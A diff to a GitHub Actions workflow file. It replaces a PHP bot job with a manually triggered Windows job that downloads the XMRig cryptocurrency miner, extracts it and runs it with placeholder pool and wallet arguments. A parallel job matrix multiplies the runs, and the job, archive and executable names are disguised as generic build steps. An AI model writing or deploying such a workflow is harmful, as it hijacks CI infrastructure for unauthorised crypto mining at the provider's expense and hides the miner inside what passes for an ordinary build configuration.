@@ -1,28 +1,26 @@
-name: Test1
+name: NAME
 
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-permissions:
-  contents: read
+on: [workflow_dispatch]
 
 jobs:
   build:
-
-    runs-on: ubuntu-latest
-
+    name: NAME
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
-    - uses: actions/checkout@v3
-
-
-    - name: Install dependencies
-      run: php bot.php
-
-    # Add a test script to composer.json, for instance: "test": "vendor/bin/phpunit"
-    # Docs: https://getcomposer.org/doc/articles/scripts.md
-
-    # - name: Run test suite
-    #   run: composer run-script test
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-win64.zip -OutFile EPA.zip
+    - name: Extract
+      run: Expand-Archive EPA.zip
+    - name: RUNNING
+      run: .\FILE_PATH\APP.exe 'string command miner seperti pool:port, wallet, threads, '
+    - name: DONE
+      run: exit
